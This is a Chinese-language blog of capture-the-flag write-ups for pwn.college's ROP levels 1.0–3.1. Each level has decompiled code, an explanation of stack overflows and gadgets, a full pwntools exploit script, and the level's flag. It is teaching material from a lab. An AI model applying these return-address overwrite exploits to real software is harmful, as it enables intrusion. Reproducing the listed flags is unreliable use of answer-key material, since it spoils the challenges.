---
title: "Write-ups: Program Security (Return Oriented Programming) series"
pubDate: "2025-01-19 13:34"
modDate: "2025-01-19 17:28"
categories:
  - "Pwn"
  - "Write-ups"
  - "ROP"
description: "Write-ups for pwn.college binary exploitation series."
slug: "return-oriented-programming"
---

## Table of contents

## 前言

我觉得应该珍惜现在的 ROP，Intel 近几年刚提出的 `CET (Control-flow Enforcement Technology)` 足以杀死绝大多数 ROP Exploit 了……以后 ROP 应该会更难一点，虽然不排除可能会出现新奇的绕过方式就是了 LOL

唉，算是经历了一个时代的变迁了吧？<s>_简单了解了一下 CET，靠，我要是早几年生我也可以想出来！！！_</s>就很感慨厉害的技术往往都是一些很简单的概念，却达到了非凡的效果，我也幻想自己可以研究点东西出来。

## Level 1.0

### Information

- Category: Pwn

### Description

> Overwrite a return address to trigger a win function!

### Write-up

带着感慨和某种说不清的复杂的心情步入本章的第一题……

```c del={5, 34} collapse={1-1, 9-30, 38-40}
int __fastcall challenge(int a1, __int64 a2, __int64 a3)
{
  _QWORD v4[3]; // [rsp+0h] [rbp-60h] BYREF
  int v5; // [rsp+1Ch] [rbp-44h]
  _BYTE buf[60]; // [rsp+20h] [rbp-40h] BYREF
  int v7; // [rsp+5Ch] [rbp-4h]
  __int64 savedregs; // [rsp+60h] [rbp+0h] BYREF
  _UNKNOWN *retaddr; // [rsp+68h] [rbp+8h] BYREF

  v5 = a1;
  v4[2] = a2;
  v4[1] = a3;
  puts(
    "This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of");
  puts("challenges, you will become painfully familiar with the concept of Return Oriented Programming!\n");
  sp_ = (__int64)v4;
  bp_ = (__int64)&savedregs;
  sz_ = ((unsigned __int64)((char *)&savedregs - (char *)v4) >> 3) + 2;
  rp_ = (__int64)&retaddr;
  puts("In this challenge, there is a win() function.");
  printf("win() will open the flag and send its data to stdout; it is at %p.\n", win);
  puts("In order to get the flag, you will need to call this function.\n");
  puts("You can call a function by directly overflowing into the saved return address,");
  printf(
    "which is stored at %p, %d bytes after the start of your input buffer.\n",
    (const void *)rp_,
    rp_ - (_QWORD)buf);
  printf(
    "That means that you will need to input at least %d bytes (%d to fill the buffer,\n",
    rp_ - (_QWORD)buf + 8,
    57);
  printf("%d to fill other stuff stored between the buffer and the return address,\n", rp_ - (_QWORD)buf - 57);
  puts("and 8 that will overwrite the return address).");
  v7 = read(0, buf, 0x1000uLL);
  printf("Received %d bytes! This is potentially %d gadgets.\n", v7, (unsigned __int64)&buf[v7 - rp_] >> 3);
  puts("Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable");
  puts("from within this challenge. You will have to do that by yourself.");
  print_chain(rp_, (unsigned int)((unsigned __int64)&buf[v7 - rp_] >> 3) + 1);
  return puts("Leaving!");
}
```

很明显的栈溢出吧，然后我们希望执行 `win`：

```c
__uid_t win()
{
  int *v0; // rax
  char *v1; // rax
  __uid_t result; // eax
  int *v3; // rax
  char *v4; // rax

  puts("You win! Here is your flag:");
  flag_fd_23114 = open("/flag", 0);
  if ( flag_fd_23114 >= 0 )
  {
    flag_length_23115 = read(flag_fd_23114, &flag_23113, 0x100uLL);
    if ( flag_length_23115 > 0 )
    {
      write(1, &flag_23113, flag_length_23115);
      return puts("\n");
    }
    else
    {
      v3 = __errno_location();
      v4 = strerror(*v3);
      return printf("\n  ERROR: Failed to read the flag -- %s!\n", v4);
    }
  }
  else
  {
    v0 = __errno_location();
    v1 = strerror(*v0);
    printf("\n  ERROR: Failed to open the flag -- %s!\n", v1);
    result = geteuid();
    if ( result )
    {
      puts("  Your effective user id is not 0!");
      return puts("  You must directly run the suid binary in order to have the correct permissions!");
    }
  }
  return result;
}
```

好吧，看来第一题比我想象中的要简单得多的多，可以说是没有任何限制条件，直接覆盖返回地址解决。~_就当是安慰我了 LMAO_~

### Exploit

```python
#!/usr/bin/python3

from pwn import ELF, context, gdb, log, p64, process, remote

context(log_level="debug", terminal="kitty")

FILE = "./babyrop_level1.0"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""

padding_to_ret = b"".ljust(0x48, b"A")
win_address = p64(0x401926)


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload():
    payload = padding_to_ret
    payload += win_address

    return payload


def attack(target, payload):
    try:
        send_payload(target, payload)
        target.recvall(timeout=3)
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch(debug=False)
        payload = construct_payload()

        attack(target, payload)
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

### Flag

Flag: `pwn.college{wpfRp_d39M4TTN2Q66mN_kfp0_g.0VM0MDL5cTNxgzW}`

## Level 1.1

### Information

- Category: Pwn

### Description

> Overwrite a return address to trigger a win function!

### Write-up

参见 [Level 1.0](#level-10)。

### Exploit

```python
#!/usr/bin/python3

from pwn import ELF, context, gdb, log, p64, process, remote

context(log_level="debug", terminal="kitty")

FILE = "./babyrop_level1.1"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""

padding_to_ret = b"".ljust(0x68, b"A")
win_address = p64(0x401CAF)


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload():
    payload = padding_to_ret
    payload += win_address

    return payload


def attack(target, payload):
    try:
        send_payload(target, payload)
        target.recvall(timeout=3)
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch(debug=False)
        payload = construct_payload()

        attack(target, payload)
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

### Flag

Flag: `pwn.college{kIrK17VA4RSajTUwItMyNbaBDJw.0lM0MDL5cTNxgzW}`

## Level 2.0

### Information

- Category: Pwn

### Description

> Use ROP to trigger a two-stage win function!

### Write-up

```c del={34} collapse={1-30, 38-40}
int __fastcall challenge(int a1, __int64 a2, __int64 a3)
{
  _QWORD v4[3]; // [rsp+0h] [rbp-80h] BYREF
  int v5; // [rsp+1Ch] [rbp-64h]
  _BYTE buf[92]; // [rsp+20h] [rbp-60h] BYREF
  int v7; // [rsp+7Ch] [rbp-4h]
  __int64 savedregs; // [rsp+80h] [rbp+0h] BYREF
  _UNKNOWN *retaddr; // [rsp+88h] [rbp+8h] BYREF

  v5 = a1;
  v4[2] = a2;
  v4[1] = a3;
  puts(
    "This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of");
  puts("challenges, you will become painfully familiar with the concept of Return Oriented Programming!\n");
  sp_ = (__int64)v4;
  bp_ = (__int64)&savedregs;
  sz_ = ((unsigned __int64)((char *)&savedregs - (char *)v4) >> 3) + 2;
  rp_ = (__int64)&retaddr;
  puts(
    "In this challenge, there are 2 stages of win functions. The functions are labeled `win_stage_1` through `win_stage_2`.");
  puts("In order to get the flag, you will need to call all of these stages in order.\n");
  puts("You can call a function by directly overflowing into the saved return address,");
  printf(
    "which is stored at %p, %d bytes after the start of your input buffer.\n",
    (const void *)rp_,
    rp_ - (_QWORD)buf);
  printf(
    "That means that you will need to input at least %d bytes (%d to fill the buffer,\n",
    rp_ - (_QWORD)buf + 8,
    79);
  printf("%d to fill other stuff stored between the buffer and the return address,\n", rp_ - (_QWORD)buf - 79);
  puts("and 8 that will overwrite the return address).");
  v7 = read(0, buf, 0x1000uLL);
  printf("Received %d bytes! This is potentially %d gadgets.\n", v7, (unsigned __int64)&buf[v7 - rp_] >> 3);
  puts("Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable");
  puts("from within this challenge. You will have to do that by yourself.");
  print_chain(rp_, (unsigned int)((unsigned __int64)&buf[v7 - rp_] >> 3) + 1);
  return puts("Leaving!");
}
```

~_真是经经又典典的开场啊，反汇编贴出来都是增加碳排放。_~

逆向发现有两个 `win` 函数：

```c
int win_stage_1()
{
  _BYTE buf[260]; // [rsp+10h] [rbp-110h] BYREF
  int v2; // [rsp+114h] [rbp-Ch]
  int v3; // [rsp+118h] [rbp-8h]
  int fd; // [rsp+11Ch] [rbp-4h]

  fd = open("/flag", 0);
  v3 = lseek(fd, 0LL, 2) / 2 + 1;
  lseek(fd, 0LL, 0);
  v2 = read(fd, buf, v3);
  write(1, buf, v2);
  return close(fd);
}
```

```c
int win_stage_2()
{
  _BYTE buf[260]; // [rsp+10h] [rbp-110h] BYREF
  int v2; // [rsp+114h] [rbp-Ch]
  int v3; // [rsp+118h] [rbp-8h]
  int fd; // [rsp+11Ch] [rbp-4h]

  fd = open("/flag", 0);
  v3 = lseek(fd, 0LL, 2) / 2 + 1;
  lseek(fd, v3, 0);
  v2 = read(fd, buf, v3);
  write(1, buf, v2);
  return close(fd);
}
```

`lseek` 函数用于修改文件指针位置，它的定义如下：

```c
// attributes: thunk
__off_t lseek(int fd, __off_t offset, int whence)
{
  return lseek(fd, offset, whence);
}
```

`fd` 是文件描述符、`offset` 是 `whence` 的偏移量、`whence` 决定了偏移的基准位置。执行成功返回新的文件偏移量，以字节为单位；失败则返回 `-1`，并设置 `errno` 表示错误原因。`whence` 有三个可选参数：`SEEK_SET (0)`、`SEEK_CUR (1)` 和 `SEEK_END (2)`，分别表示文件头、当前位置和文件末。

就以 `win_stage_1` 为例简单讲一下 `lseek` 在这里的作用：首先 `open` 返回了打开的文件描述符，`v3 = lseek(fd, 0LL, 2) / 2 + 1;` 做的是将 `fd` 的文件指针定位到文件末，返回了整个文件的大小，除以 2 相当于取这个文件的一半数据，然后加一，返回值保存到 `v3`。之后 `lseek(fd, 0LL, 0);` 又将文件指针指回文件头，`v2 = read(fd, buf, v3);` 做的是从 `fd` 读取 `v3` 字节数据到 `buf`，之后 `write(1, buf, v2);` 将 `buf` 中 `v2` 字节数据写入 `stdout`，所以整个函数就是做了一个读取文件一半加一字节内容并输出的工作。注意 `win_stage_1` 是读取前一半并输出，而 `win_stage_2` 是读取后一半并输出。

所以我们要做的很简单，就是构造 ROP Chain 依次执行这两个函数呗。

### Exploit

```python
#!/usr/bin/python3

from pwn import ELF, context, gdb, log, p64, process, remote

context(log_level="debug", terminal="kitty")

FILE = "./babyrop_level2.0"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""

padding_to_ret = b"".ljust(0x68, b"A")
win_stage_1 = p64(0x401D66)
win_stage_2 = p64(0x401E13)


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload():
    payload = padding_to_ret
    payload += win_stage_1
    payload += win_stage_2

    return payload


def attack(target, payload):
    try:
        send_payload(target, payload)
        target.recvall(timeout=3)
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch(debug=False)
        payload = construct_payload()

        attack(target, payload)
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

### Flag

Flag: `pwn.college{4v7M0arrSE56nVZynPmA1hGzVcg.01M0MDL5cTNxgzW}`

## Level 2.1

### Information

- Category: Pwn

### Description

> Use ROP to trigger a two-stage win function!

### Write-up

参见 [Level 2.0](#level-20)。

### Exploit

```python
#!/usr/bin/python3

from pwn import ELF, context, gdb, log, p64, process, remote

context(log_level="debug", terminal="kitty")

FILE = "./babyrop_level2.1"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""

padding_to_ret = b"".ljust(0x28, b"A")
win_stage_1 = p64(0x401F0F)
win_stage_2 = p64(0x401FBC)


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload():
    payload = padding_to_ret
    payload += win_stage_1
    payload += win_stage_2

    return payload


def attack(target, payload):
    try:
        send_payload(target, payload)
        target.recvall(timeout=3)
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch(debug=False)
        payload = construct_payload()

        attack(target, payload)
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

### Flag

Flag: `pwn.college{8i7RS4fxOytxYOpVidcCJE-hXqd.0FN0MDL5cTNxgzW}`

## Level 3.0

### Information

- Category: Pwn

### Description

> Use ROP to trigger a multi-stage win function!

### Write-up

为了保护环境，某些增加碳排放的东西我就不贴了，直接贴核心。

```c ins={8-9} collapse={1-4, 13-16}
int __fastcall win_stage_1(int a1)
{
  _BYTE buf[260]; // [rsp+10h] [rbp-110h] BYREF
  int v3; // [rsp+114h] [rbp-Ch]
  int v4; // [rsp+118h] [rbp-8h]
  int fd; // [rsp+11Ch] [rbp-4h]

  if ( a1 != 1 )
    return puts("Error: Incorrect value!");
  fd = open("/flag", 0);
  v4 = (int)lseek(fd, 0LL, 2) / 5 + 1;
  lseek(fd, 0LL, 0);
  v3 = read(fd, buf, v4);
  write(1, buf, v3);
  return close(fd);
}
```

```c ins={8-9} collapse={1-4, 13-16}
int __fastcall win_stage_2(int a1)
{
  _BYTE buf[260]; // [rsp+10h] [rbp-110h] BYREF
  int v3; // [rsp+114h] [rbp-Ch]
  int v4; // [rsp+118h] [rbp-8h]
  int fd; // [rsp+11Ch] [rbp-4h]

  if ( a1 != 2 )
    return puts("Error: Incorrect value!");
  fd = open("/flag", 0);
  v4 = (int)lseek(fd, 0LL, 2) / 5 + 1;
  lseek(fd, v4, 0);
  v3 = read(fd, buf, v4);
  write(1, buf, v3);
  return close(fd);
}
```

```c ins={8-9} collapse={1-4, 13-16}
int __fastcall win_stage_3(int a1)
{
  _BYTE buf[260]; // [rsp+10h] [rbp-110h] BYREF
  int v3; // [rsp+114h] [rbp-Ch]
  int v4; // [rsp+118h] [rbp-8h]
  int fd; // [rsp+11Ch] [rbp-4h]

  if ( a1 != 3 )
    return puts("Error: Incorrect value!");
  fd = open("/flag", 0);
  v4 = (int)lseek(fd, 0LL, 2) / 5 + 1;
  lseek(fd, 2 * v4, 0);
  v3 = read(fd, buf, v4);
  write(1, buf, v3);
  return close(fd);
}
```

```c ins={8-9} collapse={1-4, 13-16}
int __fastcall win_stage_4(int a1)
{
  _BYTE buf[260]; // [rsp+10h] [rbp-110h] BYREF
  int v3; // [rsp+114h] [rbp-Ch]
  int v4; // [rsp+118h] [rbp-8h]
  int fd; // [rsp+11Ch] [rbp-4h]

  if ( a1 != 4 )
    return puts("Error: Incorrect value!");
  fd = open("/flag", 0);
  v4 = (int)lseek(fd, 0LL, 2) / 5 + 1;
  lseek(fd, 3 * v4, 0);
  v3 = read(fd, buf, v4);
  write(1, buf, v3);
  return close(fd);
}
```

```c ins={8-9} collapse={1-4, 13-16}
int __fastcall win_stage_5(int a1)
{
  _BYTE buf[260]; // [rsp+10h] [rbp-110h] BYREF
  int v3; // [rsp+114h] [rbp-Ch]
  int v4; // [rsp+118h] [rbp-8h]
  int fd; // [rsp+11Ch] [rbp-4h]

  if ( a1 != 5 )
    return puts("Error: Incorrect value!");
  fd = open("/flag", 0);
  v4 = (int)lseek(fd, 0LL, 2) / 5 + 1;
  lseek(fd, 4 * v4, 0);
  v3 = read(fd, buf, v4);
  write(1, buf, v3);
  return close(fd);
}
```

这次分成了五个阶段输出，只要分别绕过这五个阶段的 `if` 即可。因为是 amd64 架构的，所以第一个参数通过 `rdi` 传递，我们直接找有关这个寄存器的 gadgets，发现：`0x402b53: pop rdi ; ret`，很好，这样的话我们先返回到这个 gadget，然后在它后面放绕过判断的参数，这个参数就会被 `pop` 到 `rdi`，之后再接函数地址就好了。

感觉这题也可以用 `D(ata)OP`，~_但是我一定不会告诉你我曾闲的蛋疼放着捷径不走试图绕远路，最后发现这条路是真 tm 远所以掉头回来走捷径的……_~

### Exploit

```python
#!/usr/bin/python3

from pwn import ELF, ROP, context, gdb, log, p64, process, remote

context(log_level="debug", terminal="kitty")

FILE = "./babyrop_level3.0"
HOST, PORT = "localhost", 1337

gdbscript = """
b *challenge+337
b *challenge+488
c
"""

padding_to_ret = b"".ljust(0x68, b"A")

win_stage_1 = p64(0x4023D9)
bypass_win_stage_1 = p64(0x1)
win_stage_2 = p64(0x402760)
bypass_win_stage_2 = p64(0x2)
win_stage_3 = p64(0x402598)
bypass_win_stage_3 = p64(0x3)
win_stage_4 = p64(0x40267A)
bypass_win_stage_4 = p64(0x4)
win_stage_5 = p64(0x4024B5)
bypass_win_stage_5 = p64(0x5)


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        global elf

        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload():
    rop = ROP(elf)

    pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"]).address

    payload = padding_to_ret

    for i in range(1, 6):
        payload += p64(pop_rdi_ret)
        payload += globals()[f"bypass_win_stage_{i}"]
        payload += globals()[f"win_stage_{i}"]

    return payload


def attack(target, payload):
    try:
        send_payload(target, payload)

        response = target.recvall(timeout=3)

        if b"pwn.college{" in response:
            return True
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch(debug=False)
        payload = construct_payload()

        if attack(target, payload):
            exit()
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

### Flag

Flag: `pwn.college{EE8eEBP70ZX0reoW2Pp8YObscck.0VN0MDL5cTNxgzW}`

## Level 3.1

### Information

- Category: Pwn

### Description

> Use ROP to trigger a multi-stage win function!

### Write-up

参见 [Level 3.0](#level-30)。

### Exploit

```python
#!/usr/bin/python3

from pwn import ELF, ROP, context, gdb, log, p64, process, remote

context(log_level="debug", terminal="kitty")

FILE = "./babyrop_level3.1"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""

padding_to_ret = b"".ljust(0x58, b"A")

win_stage_1 = p64(0x4015E3)
bypass_win_stage_1 = p64(0x1)
win_stage_2 = p64(0x40133A)
bypass_win_stage_2 = p64(0x2)
win_stage_3 = p64(0x4016BF)
bypass_win_stage_3 = p64(0x3)
win_stage_4 = p64(0x40141A)
bypass_win_stage_4 = p64(0x4)
win_stage_5 = p64(0x401500)
bypass_win_stage_5 = p64(0x5)


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        global elf

        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload():
    rop = ROP(elf)

    pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"]).address

    payload = padding_to_ret

    for i in range(1, 6):
        payload += p64(pop_rdi_ret)
        payload += globals()[f"bypass_win_stage_{i}"]
        payload += globals()[f"win_stage_{i}"]

    return payload


def attack(target, payload):
    try:
        send_payload(target, payload)

        response = target.recvall(timeout=3)

        if b"pwn.college{" in response:
            return True
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch(debug=False)
        payload = construct_payload()

        if attack(target, payload):
            exit()
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

### Flag

Flag: `pwn.college{o7dF6gbwKmwO-Xrdr1WGG5iKIQ-.0lN0MDL5cTNxgzW}`
